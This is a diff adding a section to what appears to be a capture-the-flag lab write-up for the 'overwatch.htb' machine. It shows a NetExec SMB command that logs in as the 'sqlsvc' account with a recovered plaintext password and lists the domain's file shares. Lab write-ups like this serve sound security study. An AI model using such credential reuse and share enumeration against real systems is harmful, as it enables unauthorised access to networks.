@@ -307,4 +307,21 @@ Ive loaded the `overwatch.exe` file into ILspy and found credentials in the appl
 
 # Compromising `sqlsvc`
 
+```python
+nxc smb s200401.overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' --shares
+SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv 
+SMB         10.129.244.81   445    S200401          [*] Enumerated shares
+SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
+SMB         10.129.244.81   445    S200401          -----           -----------     ------
+SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
+SMB         10.129.244.81   445    S200401          C$                              Default share
+SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
+SMB         10.129.244.81   445    S200401          NETLOGON        READ            Logon server share 
+SMB         10.129.244.81   445    S200401          software$       READ            
+SMB         10.129.244.81   445    S200401          SYSVOL          READ            Logon server share
+```
+
+This user has more access on the shares!
+
 
